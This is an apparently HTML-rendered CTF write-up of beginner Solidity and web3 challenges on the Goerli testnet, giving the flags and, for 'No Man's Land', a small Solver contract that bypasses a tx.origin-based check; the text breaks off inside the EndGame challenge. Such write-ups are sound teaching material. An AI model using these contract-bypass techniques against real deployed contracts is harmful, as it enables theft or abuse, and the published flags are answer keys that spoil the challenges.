<style data-emotion="css xm64py">.css-xm64py{font-family:Sen;font-weight:var(--chakra-fontWeights-bold);font-size:40px;line-height:1.33;color:#6d6875;margin-top:var(--chakra-space-10);margin-bottom:var(--chakra-space-6);}@media screen and (min-width: 48em){.css-xm64py{line-height:1.2;}}</style><h3 class="chakra-heading css-xm64py" id="#1 lesson learned">#1 Lesson learned</h3>
<p class="chakra-text css-0" node="[object Object]">I know how to get informations about a contract by using a block explorer.</p>
<h2 class="chakra-heading css-1uc67dn" id="s0lx">S0lx</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924217/Friendly-ctf/solx_bomnck.png" alt="S0lx" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">S0lx</p></div></div></p>
<ol>
<li>
<p class="chakra-text css-0" node="[object Object]">Read the solidity file</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>    string </span><span class="token" style="color:#569CD6">public</span><span> immutable </span><span class="token" style="color:#9cdcfe">X</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#ce9178">&quot;COntr4cts_&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">answer</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">string memory</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span>        </span><span class="token" style="color:#9cdcfe">S</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">&quot;S0l1dItY_&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>        </span><span class="token" style="color:#9cdcfe">O</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">&quot;securinets{&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>        </span><span class="token" style="color:#9cdcfe">L</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">&quot;ARe_4w3s0m3}&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#dcdcaa">string</span><span class="token" style="color:#d4d4d4">(</span><span>abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">encodePacked</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">O</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe">S</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#9cdcfe">X</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#9cdcfe">L</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span>
</span></code></div></pre>
</li>
<li>
<p class="chakra-text css-0" node="[object Object]">We are concatenating a string here using <code class="inline-code">abi.encodePacked</code> (encoding bytes basically and packing them together ~ low level string concatination)</p>
</li>
<li>
<p class="chakra-text css-0" node="[object Object]">Get the letters content in the right order -&gt; <code class="inline-code">securinets{S0l1dItY_COntr4cts_ARe_4w3s0m3}</code></p>
</li>
</ol>
<h3 class="chakra-heading css-xm64py" id="#2 lesson learned">#2 Lesson learned</h3>
<p class="chakra-text css-0" node="[object Object]">Solidity is a cool language, but it has its own way of doing things.</p>
<style data-emotion="css 17l36zw">.css-17l36zw{margin-top:60px;margin-bottom:60px;height:1px;background-color:#3d5a80;}</style><div class="css-17l36zw"></div>
<h2 class="chakra-heading css-1uc67dn" id="int3r4ct">Int3r4ct</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924218/Friendly-ctf/int3ra4ct_holqse.png" alt="Int3r4ct" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Int3r4ct</p></div></div></p>
<ol>
<li>
<p class="chakra-text css-0" node="[object Object]">Change metamask connection to goerli testnet. <a class="chakra-link css-9olwc6" href="https://blog.cryptostars.is/goerli-g%C3%B6rli-testnet-network-to-metamask-and-receiving-test-ethereum-in-less-than-2-min-de13e6fe5677">Tutorial</a></p>
</li>
<li>
<p class="chakra-text css-0" node="[object Object]">Open the developer&#x27;s console <code class="inline-code">CTRL+SHIT+I</code></p>
</li>
<li>
<p class="chakra-text css-0" node="[object Object]">Logs indicate that <code class="inline-code">web3js</code> and <code class="inline-code">InteractContract</code> are injected into the console.</p>
</li>
<li>
<p class="chakra-text css-0" node="[object Object]">Now seeing the docs of <code class="inline-code">web3js</code> library we see that to call a contract we have to do <code class="inline-code">contractInstance.methods.methodName().call()</code> and it returns a promise
<a class="chakra-link css-9olwc6" href="https://web3js.readthedocs.io/en/v1.2.11/web3-eth-contract.html#methods-mymethod-call">Web3js Docs Reference</a></p>
</li>
<li>
<p class="chakra-text css-0" node="[object Object]">Execute it, we should add <code class="inline-code">await</code> because it returns a promise. <code class="inline-code">await InteractContract.methods.FLAG().call()</code></p>
</li>
<li>
<p class="chakra-text css-0" node="[object Object]">Enjoy the flag <code class="inline-code">securinets{Y0u_Int3r4ct3d_With_The_Contr4ct_Usin6_The_Web3j_L1br4ry}</code></p>
</li>
</ol>
<h3 class="chakra-heading css-xm64py" id="#3 lesson learned">#3 Lesson Learned</h3>
<p class="chakra-text css-0" node="[object Object]">There are librairies with which you can craft payloads and different scripts. They can make your life a lot easier !</p>
<div class="css-17l36zw"></div>
<h2 class="chakra-heading css-1uc67dn" id="gr33dyr0b0t">Gr33dyR0b0t</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924235/Friendly-ctf/greedy-robots-ch_rnd2ve.png" alt="Greedy Robot" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Greedy Robot</p></div></div></p>
<ol>
<li>Change metamask connection to goerli testnet. <a class="chakra-link css-9olwc6" href="https://blog.cryptostars.is/goerli-g%C3%B6rli-testnet-network-to-metamask-and-receiving-test-ethereum-in-less-than-2-min-de13e6fe5677">Tutorial</a></li>
<li>Do some web enumeration, you will find the robot address in a html comment<!-- -->
<blockquote>
<p class="chakra-text css-0" node="[object Object]">DEV NOTE: Hook contract to dapp 0x79089d5B521030852EdEEeF47A3cD726F3d59e7b</p>
</blockquote>
</li>
</ol>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/send-ethers-metamask_ymvjpv.png" alt="Send Ethers with metamask" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Send Ethers with metamask</p></div></div></p>
<ol start="3">
<li>Send ethers to the robot and get the flag <code class="inline-code">securinets{p0intless_g3n3ros1tY}</code></li>
</ol>
<h3 class="chakra-heading css-xm64py" id="#4 lesson learned">#4 Lesson learned</h3>
<p class="chakra-text css-0" node="[object Object]">Sending money in the blockchain is so easy. But that what makes it a source of danger.</p>
<div class="css-17l36zw"></div>
<h2 class="chakra-heading css-1uc67dn" id="no man&#x27;s land">No Man&#x27;s Land</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924234/Friendly-ctf/No-man-land_edtogs.png" alt="No Man&#x27;s Land" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">No Man&#x27;s Land</p></div></div></p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#6a9955">// SPDX-License-Identifier: UNLICENSED</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>pragma solidity </span><span class="token" style="color:#d4d4d4">^</span><span class="token" style="color:#b5cea8">0.8</span><span class="token" style="color:#b5cea8">.13</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>contract </span><span class="token" style="color:#4ec9b0">NoManLand</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>    </span><span class="token" style="color:#dcdcaa">mapping</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address</span><span> </span><span class="token" style="color:#569CD6">=&gt;</span><span> bool</span><span class="token" style="color:#d4d4d4">)</span><span> flagHolders</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>    event </span><span class="token" style="color:#dcdcaa">WonFlag</span><span class="token" style="color:#d4d4d4">(</span><span>address indexed</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">sendFlag</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>        </span><span class="token" style="color:#dcdcaa">require</span><span class="token" style="color:#d4d4d4">(</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span>            tx</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">origin</span><span> </span><span class="token" style="color:#d4d4d4">!=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">sender</span><span class="token" style="color:#d4d4d4">,</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>            </span><span class="token" style="color:#ce9178">&quot;Hey you are not getting the point here&quot;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>        flagHolders</span><span class="token" style="color:#d4d4d4">[</span><span>tx</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">origin</span><span class="token" style="color:#d4d4d4">]</span><span> </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span>        emit </span><span class="token" style="color:#dcdcaa">WonFlag</span><span class="token" style="color:#d4d4d4">(</span><span>tx</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">origin</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">canGetFlag</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address playerAddress</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> view </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> flagHolders</span><span class="token" style="color:#d4d4d4">[</span><span>playerAddress</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">22</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">23</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">24</span>
</span></code></div></pre>
<ol>
<li>We can notice the <code class="inline-code">require()</code>, it reverts the transaction when <code class="inline-code">tx.origin!=msg.sender</code></li>
</ol>
<p class="chakra-text css-0" node="[object Object]">So let&#x27;s understand what&#x27;s <code class="inline-code">tx.origin</code> and <code class="inline-code">msg.sender</code>:</p>
<ul>
<li><code class="inline-code">tx.origin</code> is the address that started the transactions.( Called a function of a contract which calls the function from another contract client -&gt; contract -&gt; contract falls all under one transaction. The client here is the <code class="inline-code">tx.origin</code>.</li>
<li><code class="inline-code">msg.sender</code> is the direct address of the one that is calling the function. So if we got contract1 -&gt; contract2 -&gt; contract3 where <code class="inline-code">-&gt;</code> is a function call. The contract3 will have as <code class="inline-code">msg.sender</code> value the address of the contract2 and <code class="inline-code">contract2</code> will have as <code class="inline-code">msg.sender</code> value the address of contract1.</li>
</ul>
<p class="chakra-text css-0" node="[object Object]"><a class="chakra-link css-9olwc6" href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/">Consensys Tx.origin</a></p>
<ol start="2">
<li>So let&#x27;s craft a contract that works as an intermediate to calling the <code class="inline-code">sendFlag</code> function.</li>
</ol>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#6a9955">// SPDX-License-Identifier: UNLICENSED</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>pragma solidity </span><span class="token" style="color:#d4d4d4">^</span><span class="token" style="color:#b5cea8">0.8</span><span class="token" style="color:#b5cea8">.13</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span></span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">NoManLand</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>      </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">sendFlag</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>contract </span><span class="token" style="color:#4ec9b0">Solver</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>    </span><span class="token" style="color:#4ec9b0">NoManLand</span><span> </span><span class="token" style="color:#569CD6">public</span><span> victimContract</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>    </span><span class="token" style="color:#dcdcaa">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">address victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span>        victimContract</span><span class="token" style="color:#d4d4d4">=</span><span class="token" style="color:#dcdcaa">NoManLand</span><span class="token" style="color:#d4d4d4">(</span><span>victimAddress</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getFlag</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#dcdcaa">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">bool</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span>        victimContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">sendFlag</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span><span>        </span><span class="token" style="color:#c586c0">return</span><span> victimContract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">canGetFlag</span><span class="token" style="color:#d4d4d4">(</span><span>tx</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">origin</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">19</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">20</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">21</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">We can use <a class="chakra-link css-9olwc6" href="https://remix.ethereum.org/">Remix IDE</a>, to deploy the contract. 4. We execute the <code class="inline-code">getFlag</code> 3. After the transaction succeeds,We go to the website and verify.
<code class="inline-code">securinets{F4ck_Hnm4ns_Sm4rt_C0n5racts_R0kx}</code></p>
<h3 class="chakra-heading css-xm64py" id="#5 lesson learned">#5 Lesson learned</h3>
<ul>
<li><code class="inline-code">tx.origin</code> is a bad way to identify the other party.</li>
</ul>
<div class="css-17l36zw"></div>
<h2 class="chakra-heading css-1uc67dn" id="endgame">EndGame</h2>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/endgame_cfigxc.png" alt="End game" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">End game</p></div></div></p>
<ol>
<li>Reading the logic of the contract we find one interesting function:</li>
</ol>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">climbLeaderboard</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#9cdcfe">uint256 tryhardCoeff</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#9cdcfe"> address realPlayerAddress</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>            </span><span class="token" style="color:#569CD6">public</span><span>
